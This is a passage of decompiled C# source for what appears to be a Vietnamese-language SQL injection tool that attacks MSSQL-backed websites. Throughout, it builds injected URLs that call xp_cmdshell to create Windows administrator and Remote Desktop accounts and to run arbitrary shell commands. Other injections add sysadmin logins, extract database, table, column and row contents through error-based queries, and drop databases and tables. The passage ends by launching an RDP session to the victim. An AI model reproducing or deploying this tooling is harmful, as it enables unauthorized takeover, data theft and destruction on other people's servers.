				num = Convert.ToInt32(responseString.IndexOf(thongbao1_3)) + 27;
				length = Convert.ToInt32(responseString.IndexOf(thongbao2_3)) - num;
			}
		}
		try
		{
			((Control)textBox6).set_Text(responseString.Substring(num, length));
			load = 1;
		}
		catch (Exception)
		{
			MessageBox.Show("Không thể lấy được dữ liệu");
			load = 1;
		}
	}

	private void button5_Click(object sender, EventArgs e)
	{
		string[] array = ((Control)textBox1).get_Text().Split(new char[1] { '/' });
		if (array[2].Substring(0, 4).Trim() == "www.")
		{
			StreamWriter streamWriter = File.CreateText("Remote.bat");
			streamWriter.Write("");
			if (((Control)textBox6).get_Text() == "" || ((Control)textBox6).get_Text().Trim() == "3389")
			{
				streamWriter.WriteLine("mstsc -v:" + array[2].Substring(4, Convert.ToInt32(array[2].Length) - 4).ToString());
			}
			else
			{
				streamWriter.WriteLine("mstsc -v:" + array[2].Substring(4, Convert.ToInt32(array[2].Length) - 4).ToString() + ":" + ((Control)textBox6).get_Text());
			}
			streamWriter.Close();
			Process.Start("Remote.bat");
		}
		else
		{
			StreamWriter streamWriter = File.CreateText("Remote.bat");
			streamWriter.Write("");
			if (((Control)textBox6).get_Text() == "" || ((Control)textBox6).get_Text().Trim() == "3389")
			{
				streamWriter.WriteLine("mstsc -v:" + array[2]);
			}
			else
			{
				streamWriter.WriteLine("mstsc -v:" + array[2] + ":" + ((Control)textBox6).get_Text());
			}
			streamWriter.Close();
			Process.Start("Remote.bat");
		}
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		((Control)webBrowser1).Hide();
		webBrowser1.Navigate("http://www.wee.info/thongbao.txt");
		((Control)label10).Hide();
		((Control)textBox10).Hide();
		((Control)groupBox2).Hide();
		((Control)button2).set_Enabled(false);
		((Control)button3).set_Enabled(false);
		((Control)button4).set_Enabled(false);
		((Control)button5).set_Enabled(false);
		((Control)button6).set_Enabled(false);
		((Control)button7).set_Enabled(false);
		((Control)button8).set_Enabled(false);
		((Control)button9).set_Enabled(false);
		((Control)button10).set_Enabled(false);
		((Control)button11).set_Enabled(false);
		((Control)button12).set_Enabled(false);
		((Control)button13).set_Enabled(false);
		((Control)button14).set_Enabled(false);
		((Control)button15).set_Enabled(false);
		((Control)button16).set_Enabled(false);
		((Control)button17).set_Enabled(false);
		((Control)button18).set_Enabled(false);
		((Control)button19).set_Enabled(false);
		((Control)button20).set_Enabled(false);
		((Control)button21).set_Enabled(false);
		((Control)button22).set_Enabled(false);
		((Control)button23).set_Enabled(false);
		((Control)button24).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem2).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem3).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem4).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem5).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem6).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem7).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem8).set_Enabled(false);
		((ToolStripItem)toolStripMenuItem9).set_Enabled(false);
		((Control)comboBox2).set_Enabled(false);
		((Control)radioButton1).set_Enabled(false);
		((Control)radioButton2).set_Enabled(false);
		((Control)comboBox3).set_Enabled(false);
	}

	private void button9_Click(object sender, EventArgs e)
	{
		((Control)groupBox2).Hide();
	}

	private void button8_Click(object sender, EventArgs e)
	{
		((Control)textBox7).set_Text("");
		((Control)textBox8).set_Text("");
	}

	private void button6_Click(object sender, EventArgs e)
	{
		((Control)groupBox2).set_Text("Window User");
		((Control)groupBox2).Show();
		((Control)button11).Hide();
		((Control)button7).Show();
	}

	private void button7_Click(object sender, EventArgs e)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox7).get_Text() == "" || ((Control)textBox8).get_Text() == "")
		{
			MessageBox.Show("Bạn phải điền đủ thông tin tài khoản");
			return;
		}
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + ";exec master..xp_cmdshell 'net user " + ((Control)textBox7).get_Text() + " " + ((Control)textBox8).get_Text() + " /add'--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";exec master..xp_cmdshell 'net localgroup administrators " + ((Control)textBox7).get_Text() + " /add'--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";exec master..xp_cmdshell 'net localgroup \"Remote Desktop Users\" " + ((Control)textBox7).get_Text() + " /add'--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		load = 1;
	}

	private void button10_Click(object sender, EventArgs e)
	{
		((Control)groupBox2).set_Text("MSSQL User");
		((Control)groupBox2).Show();
		((Control)button11).Show();
		((Control)button7).Hide();
	}

	private void button11_Click(object sender, EventArgs e)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox7).get_Text() == "" || ((Control)textBox8).get_Text() == "")
		{
			MessageBox.Show("Bạn phải điền đủ thông tin tài khoản");
			return;
		}
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + ";exec sp_addlogin " + ((Control)textBox7).get_Text() + ", " + ((Control)textBox8).get_Text() + "--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + ";exec sp_addsrvrolemember " + ((Control)textBox7).get_Text() + ", sysadmin--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		load = 1;
	}

	private void button12_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		UploadForm uploadForm = new UploadForm();
		((Form)uploadForm).ShowDialog();
	}

	private void button13_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		RegistryForm registryForm = new RegistryForm();
		((Form)registryForm).ShowDialog();
	}

	private void button14_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox9).get_Text() == "")
		{
			MessageBox.Show("Bạn chưa gõ câu lệnh CMD");
			return;
		}
		((TextBoxBase)richTextBox2).Clear();
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string responseString = "";
		Uri requestURI = null;
		weblink = ((Control)textBox1).get_Text() + ";drop table millkak create table millkak (id int identity,noi_dung varchar(1000)) insert into millkak exec master..xp_cmdshell '" + ((Control)textBox9).get_Text() + "'--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		int num = 0;
		int num2 = 0;
		requestURI = null;
		responseString = "";
		weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select convert(varchar,isnull(convert(varchar, count(id)),NULL))%2bchar(124) from millkak))--sp_password" + ((Control)textBox2).get_Text();
		GetHtmlSource(out responseString, requestURI);
		num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
		num2 = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num - 1;
		if (num == 6)
		{
			num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
			num2 = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num - 1;
			if (num == 11)
			{
				num = Convert.ToInt32(responseString.IndexOf(thongbao1_3)) + 16;
				num2 = Convert.ToInt32(responseString.IndexOf(thongbao2_3)) - num - 1;
			}
		}
		int num3 = Convert.ToInt32(responseString.Substring(num, num2));
		for (int i = 1; i <= num3; i++)
		{
			requestURI = null;
			responseString = "";
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select convert(varchar(1000),isnull(convert(varchar(1000), noi_dung),NULL)) from millkak where id=" + i + "))--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out responseString, requestURI);
			num = Convert.ToInt32(responseString.IndexOf(thongbao1)) + 7;
			num2 = Convert.ToInt32(responseString.IndexOf(thongbao2)) - num;
			if (num == 6)
			{
				num = Convert.ToInt32(responseString.IndexOf(thongbao1_2)) + 12;
				num2 = Convert.ToInt32(responseString.IndexOf(thongbao2_2)) - num;
				if (num == 11)
				{
					num = Convert.ToInt32(responseString.IndexOf(thongbao1_3)) + 16;
					num2 = Convert.ToInt32(responseString.IndexOf(thongbao2_3)) - num;
				}
			}
			try
			{
				RichTextBox obj = richTextBox2;
				((Control)obj).set_Text(((Control)obj).get_Text() + responseString.Substring(num, num2));
			}
			catch (Exception)
			{
				RichTextBox obj2 = richTextBox2;
				((Control)obj2).set_Text(((Control)obj2).get_Text() + "\n");
			}
		}
		load = 1;
	}

	private void button15_Click(object sender, EventArgs e)
	{
		listBox1.get_Items().Clear();
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string text = "";
		Uri uri = null;
		int num = 0;
		int num2 = 0;
		int num3 = 0;
		while (true)
		{
			uri = null;
			text = "";
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,db_name(" + num3 + "))--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out text, uri);
			num = Convert.ToInt32(text.IndexOf(thongbao1)) + 7;
			num2 = Convert.ToInt32(text.IndexOf(thongbao2)) - num;
			if (num == 6)
			{
				num = Convert.ToInt32(text.IndexOf(thongbao1_2)) + 12;
				num2 = Convert.ToInt32(text.IndexOf(thongbao2_2)) - num;
				if (num == 11)
				{
					num = Convert.ToInt32(text.IndexOf(thongbao1_3)) + 16;
					num2 = Convert.ToInt32(text.IndexOf(thongbao2_3)) - num;
				}
			}
			try
			{
				listBox1.get_Items().Add((object)text.Substring(num, num2));
			}
			catch (Exception)
			{
				break;
			}
			num3++;
		}
		load = 1;
	}

	private void button16_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		CreateDBForm createDBForm = new CreateDBForm();
		((Form)createDBForm).ShowDialog();
	}

	private void button17_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			MessageBox.Show("Không có database nào");
			return;
		}
		DialogResult val = MessageBox.Show("Bạn có chắc chắn muốn xóa database này ?", "Drop Database Message", (MessageBoxButtons)4, (MessageBoxIcon)48);
		if ((int)val == 6)
		{
			LoadForm loadForm = new LoadForm();
			((Control)loadForm).Show();
			Uri requestURI = null;
			string responseString = "";
			weblink = ((Control)textBox1).get_Text() + ";drop database " + ((Control)listBox1).get_Text() + "--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out responseString, requestURI);
			load = 1;
		}
	}

	private void button18_Click(object sender, EventArgs e)
	{
		LoadForm loadForm;
		int num3;
		Uri uri;
		string text;
		int num;
		int num2;
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			listBox2.get_Items().Clear();
			loadForm = new LoadForm();
			((Control)loadForm).Show();
			text = "";
			uri = null;
			num = 0;
			num2 = 0;
			num3 = 0;
			while (true)
			{
				uri = null;
				text = "";
				if (Convert.ToInt32(listBox1.get_Items().get_Count()) != 0)
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 table_name from " + ((Control)textBox4).get_Text() + ".information_schema.tables where table_name not in (select top " + num3 + " table_name from " + ((Control)textBox4).get_Text() + ".information_schema.tables)))--sp_password" + ((Control)textBox2).get_Text();
				}
				else
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in (select top " + num3 + " table_name from information_schema.tables)))--sp_password" + ((Control)textBox2).get_Text();
				}
				GetHtmlSource(out text, uri);
				num = Convert.ToInt32(text.IndexOf(thongbao1)) + 7;
				num2 = Convert.ToInt32(text.IndexOf(thongbao2)) - num;
				if (num == 6)
				{
					num = Convert.ToInt32(text.IndexOf(thongbao1_2)) + 12;
					num2 = Convert.ToInt32(text.IndexOf(thongbao2_2)) - num;
					if (num == 11)
					{
						num = Convert.ToInt32(text.IndexOf(thongbao1_3)) + 16;
						num2 = Convert.ToInt32(text.IndexOf(thongbao2_3)) - num;
					}
				}
				try
				{
					listBox2.get_Items().Add((object)text.Substring(num, num2));
				}
				catch (Exception)
				{
					break;
				}
				num3++;
			}
			load = 1;
			return;
		}
		listBox2.get_Items().Clear();
		loadForm = new LoadForm();
		((Control)loadForm).Show();
		text = "";
		uri = null;
		num = 0;
		num2 = 0;
		num3 = 1;
		while (true)
		{
			uri = null;
			text = "";
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 table_name from " + ((Control)listBox1).get_Text() + ".information_schema.tables where table_name not in (select top " + num3 + " table_name from " + ((Control)listBox1).get_Text() + ".information_schema.tables)))--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out text, uri);
			num = Convert.ToInt32(text.IndexOf(thongbao1)) + 7;
			num2 = Convert.ToInt32(text.IndexOf(thongbao2)) - num;
			if (num == 6)
			{
				num = Convert.ToInt32(text.IndexOf(thongbao1_2)) + 12;
				num2 = Convert.ToInt32(text.IndexOf(thongbao2_2)) - num;
				if (num == 11)
				{
					num = Convert.ToInt32(text.IndexOf(thongbao1_3)) + 16;
					num2 = Convert.ToInt32(text.IndexOf(thongbao2_3)) - num;
				}
			}
			try
			{
				listBox2.get_Items().Add((object)text.Substring(num, num2));
			}
			catch (Exception)
			{
				break;
			}
			num3++;
		}
		load = 1;
	}

	private void button20_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		if (Convert.ToInt32(listBox2.get_Items().get_Count()) == 0)
		{
			MessageBox.Show("Không có table nào");
			return;
		}
		DialogResult val = MessageBox.Show("Bạn có chắc chắn muốn xóa table này ?", "Drop Database Message", (MessageBoxButtons)4, (MessageBoxIcon)48);
		if ((int)val == 6)
		{
			LoadForm loadForm = new LoadForm();
			((Control)loadForm).Show();
			Uri requestURI = null;
			string responseString = "";
			if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
			{
				weblink = ((Control)textBox1).get_Text() + ";drop table " + ((Control)listBox2).get_Text() + "--sp_password" + ((Control)textBox2).get_Text();
			}
			else
			{
				weblink = ((Control)textBox1).get_Text() + ";drop table " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + "--sp_password" + ((Control)textBox2).get_Text();
			}
			GetHtmlSource(out responseString, requestURI);
			load = 1;
		}
	}

	private void button19_Click(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			database = ((Control)textBox4).get_Text();
		}
		else
		{
			database = ((Control)listBox1).get_Text();
		}
		table = ((Control)listBox2).get_Text();
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		TableInfoForm tableInfoForm = new TableInfoForm();
		((Form)tableInfoForm).ShowDialog();
	}

	private void button21_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Unknown result type (might be due to invalid IL or missing references)
		LoadForm loadForm;
		Encoding aSCII;
		byte[] bytes;
		byte[] array;
		string text;
		int num3;
		Uri uri;
		string text2;
		int num;
		int num2;
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			if (Convert.ToInt32(listBox2.get_Items().get_Count()) == 0)
			{
				MessageBox.Show("Bạn chưa lấy table");
				return;
			}
			((ObjectCollection)checkedListBox1.get_Items()).Clear();
			loadForm = new LoadForm();
			((Control)loadForm).Show();
			text = "";
			aSCII = Encoding.ASCII;
			bytes = aSCII.GetBytes(((Control)listBox2).get_Text());
			array = bytes;
			foreach (byte b in array)
			{
				text = text + "char(" + b + ")%2b";
			}
			text = text.Substring(0, Convert.ToInt32(text.Length) - 3);
			text2 = "";
			uri = null;
			num = 0;
			num2 = 0;
			num3 = 0;
			while (true)
			{
				uri = null;
				text2 = "";
				weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name = " + text + " and column_name not in (select top " + num3 + " column_name from information_schema.columns where table_name = " + text + ")))--sp_password" + ((Control)textBox2).get_Text();
				GetHtmlSource(out text2, uri);
				num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
				num2 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
				if (num == 6)
				{
					num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
					num2 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
					if (num == 11)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
						num2 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
					}
				}
				try
				{
					((ObjectCollection)checkedListBox1.get_Items()).Add((object)text2.Substring(num, num2));
				}
				catch (Exception)
				{
					break;
				}
				num3++;
			}
			load = 1;
			return;
		}
		if (Convert.ToInt32(listBox2.get_Items().get_Count()) == 0)
		{
			MessageBox.Show("Bạn chưa lấy table");
			return;
		}
		((ObjectCollection)checkedListBox1.get_Items()).Clear();
		loadForm = new LoadForm();
		((Control)loadForm).Show();
		text = "";
		aSCII = Encoding.ASCII;
		bytes = aSCII.GetBytes(((Control)listBox2).get_Text());
		array = bytes;
		foreach (byte b in array)
		{
			text = text + "char(" + b + ")%2b";
		}
		text = text.Substring(0, Convert.ToInt32(text.Length) - 3);
		text2 = "";
		uri = null;
		num = 0;
		num2 = 0;
		num3 = 0;
		while (true)
		{
			uri = null;
			text2 = "";
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 column_name from " + ((Control)listBox1).get_Text() + ".information_schema.columns where table_name = " + text + " and column_name not in (select top " + num3 + " column_name from " + ((Control)listBox1).get_Text() + ".information_schema.columns where table_name = " + text + ")))--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out text2, uri);
			num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
			num2 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
			if (num == 6)
			{
				num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
				num2 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
				if (num == 11)
				{
					num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
					num2 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
				}
			}
			try
			{
				((ObjectCollection)checkedListBox1.get_Items()).Add((object)text2.Substring(num, num2));
			}
			catch (Exception)
			{
				break;
			}
			num3++;
		}
		load = 1;
	}

	private void button22_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		if (checkedListBox1.get_CheckedItems().get_Count() == 0)
		{
			MessageBox.Show("Bạn phải tick vào 1 column cần xem");
			return;
		}
		if (checkedListBox1.get_CheckedItems().get_Count() > 1)
		{
			MessageBox.Show("Chỉ được phép xem 1 column");
			return;
		}
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			database = ((Control)textBox4).get_Text();
		}
		else
		{
			database = ((Control)listBox1).get_Text();
		}
		table = ((Control)listBox2).get_Text();
		address1 = ((Control)textBox1).get_Text();
		address2 = ((Control)textBox2).get_Text();
		column = checkedListBox1.get_CheckedItems().get_Item(0).ToString();
	}

	private void button24_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		if (checkedListBox1.get_CheckedItems().get_Count() == 0)
		{
			MessageBox.Show("Bạn phải tick vào 1 trường");
			return;
		}
		((Control)comboBox2).set_Enabled(true);
		((Control)radioButton1).set_Enabled(true);
		((Control)radioButton2).set_Enabled(true);
		((Control)comboBox3).set_Enabled(true);
		((Control)richTextBox3).set_Text("");
		string text = "";
		select = "";
		comboBox2.get_Items().Clear();
		for (int i = 0; i <= checkedListBox1.get_CheckedItems().get_Count() - 1; i++)
		{
			comboBox2.get_Items().Add(checkedListBox1.get_CheckedItems().get_Item(i));
			select = select + "convert(varchar(1000),isnull(convert(varchar(1000)," + checkedListBox1.get_CheckedItems().get_Item(i).ToString() + "),NULL))%2bchar(124)%2b";
			text = text + "," + checkedListBox1.get_CheckedItems().get_Item(i).ToString();
		}
		text = text.Substring(1, Convert.ToInt32(text.Length) - 1);
		((Control)richTextBox3).set_Text("select " + text + " from " + ((Control)listBox2).get_Text());
		((ListControl)comboBox2).set_SelectedIndex(0);
	}

	private void button23_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d15: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_18cf: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)comboBox2).get_Text() == "")
		{
			MessageBox.Show("Phải chọn 1 trường để lọc");
			return;
		}
		LoadForm loadForm;
		string text;
		Uri uri;
		string text2;
		int num;
		if (radioButton1.get_Checked().ToString() == "True")
		{
			loadForm = new LoadForm();
			((Control)loadForm).Show();
			((Control)richTextBox4).set_Text("");
			text = select.Substring(0, Convert.ToInt32(select.Length) - 15);
			text2 = "";
			uri = null;
			num = 0;
			int num2 = 0;
			uri = null;
			string text3 = "";
			Encoding aSCII = Encoding.ASCII;
			byte[] bytes = aSCII.GetBytes(((Control)textBox10).get_Text());
			byte[] array = bytes;
			foreach (byte b in array)
			{
				text3 = text3 + "char(" + b + ")%2b";
			}
			text3 = text3.Substring(0, Convert.ToInt32(text3.Length) - 3);
			text2 = "";
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " = " + text3 + "))--sp_password" + ((Control)textBox2).get_Text();
			GetHtmlSource(out text2, uri);
			num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
			num2 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num - 1;
			if (num == 6)
			{
				num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
				num2 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num - 1;
				if (num == 11)
				{
					num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
					num2 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num - 1;
				}
			}
			try
			{
				string[] array2 = text2.Substring(num, num2).Split(new char[1] { '|' });
				int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
				for (int j = 0; j < num3; j++)
				{
					RichTextBox obj = richTextBox4;
					string text4 = ((Control)obj).get_Text();
					((Control)obj).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
					if (j == num3 - 1)
					{
						RichTextBox obj2 = richTextBox4;
						((Control)obj2).set_Text(((Control)obj2).get_Text() + "\n======================\n");
					}
				}
			}
			catch (Exception)
			{
				RichTextBox obj3 = richTextBox4;
				((Control)obj3).set_Text(((Control)obj3).get_Text() + "\n");
			}
			load = 1;
			return;
		}
		loadForm = new LoadForm();
		((Control)loadForm).Show();
		((Control)richTextBox4).set_Text("");
		text = select.Substring(0, Convert.ToInt32(select.Length) - 15);
		text2 = "";
		uri = null;
		num = 0;
		int num4 = 0;
		uri = null;
		text2 = "";
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select convert(varchar,isnull(convert(varchar, count(" + ((Control)comboBox2).get_Text() + ")),NULL))%2bchar(124) from " + ((Control)listBox2).get_Text() + "))--sp_password" + ((Control)textBox2).get_Text();
		}
		else
		{
			weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select convert(varchar,isnull(convert(varchar, count(" + ((Control)comboBox2).get_Text() + ")),NULL))%2bchar(124) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + "))--sp_password" + ((Control)textBox2).get_Text();
		}
		GetHtmlSource(out text2, uri);
		num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
		num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num - 1;
		if (num == 6)
		{
			num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
			num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num - 1;
			if (num == 11)
			{
				num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
				num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num - 1;
			}
		}
		int num5 = Convert.ToInt32(text2.Substring(num, num4));
		if (((Control)comboBox3).get_Text() == "Lấy hết bản ghi")
		{
			for (int k = 0; k <= num5; k++)
			{
				uri = null;
				text2 = "";
				if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + k + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
				}
				else
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + k + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
				}
				GetHtmlSource(out text2, uri);
				num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
				num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
				if (num == 6)
				{
					num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
					num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
					if (num == 11)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
						num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
					}
				}
				try
				{
					string[] array2 = text2.Substring(num, num4).Split(new char[1] { '|' });
					int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
					for (int j = 0; j < num3; j++)
					{
						RichTextBox obj4 = richTextBox4;
						string text4 = ((Control)obj4).get_Text();
						((Control)obj4).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
						if (j == num3 - 1)
						{
							RichTextBox obj5 = richTextBox4;
							((Control)obj5).set_Text(((Control)obj5).get_Text() + "\n======================\n");
						}
					}
				}
				catch (Exception)
				{
					RichTextBox obj6 = richTextBox4;
					((Control)obj6).set_Text(((Control)obj6).get_Text() + "\n");
				}
			}
		}
		else if (((Control)comboBox3).get_Text() == "Lấy từng bản ghi")
		{
			if (i3 <= num5)
			{
				uri = null;
				text2 = "";
				if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i3 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
				}
				else
				{
					weblink = ((Control)textBox1).get_Text() + " and 1=convert(int,(select top 1 " + text + " from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + " where " + ((Control)comboBox2).get_Text() + " not in (select top " + i3 + " convert(varchar,isnull(convert(varchar, " + ((Control)comboBox2).get_Text() + "),NULL)) from " + ((Control)listBox1).get_Text() + ".dbo." + ((Control)listBox2).get_Text() + ")))--sp_password" + ((Control)textBox2).get_Text();
				}
				GetHtmlSource(out text2, uri);
				i3++;
				num = Convert.ToInt32(text2.IndexOf(thongbao1)) + 7;
				num4 = Convert.ToInt32(text2.IndexOf(thongbao2)) - num;
				if (num == 6)
				{
					num = Convert.ToInt32(text2.IndexOf(thongbao1_2)) + 12;
					num4 = Convert.ToInt32(text2.IndexOf(thongbao2_2)) - num;
					if (num == 11)
					{
						num = Convert.ToInt32(text2.IndexOf(thongbao1_3)) + 16;
						num4 = Convert.ToInt32(text2.IndexOf(thongbao2_3)) - num;
					}
				}
				try
				{
					string[] array2 = text2.Substring(num, num4).Split(new char[1] { '|' });
					int num3 = Convert.ToInt32(comboBox2.get_Items().get_Count());
					for (int j = 0; j < num3; j++)
					{
						RichTextBox obj7 = richTextBox4;
						string text4 = ((Control)obj7).get_Text();
						((Control)obj7).set_Text(text4 + comboBox2.get_Items().get_Item(j).ToString() + " : " + array2[j] + "\n");
						if (j == num3 - 1)
						{
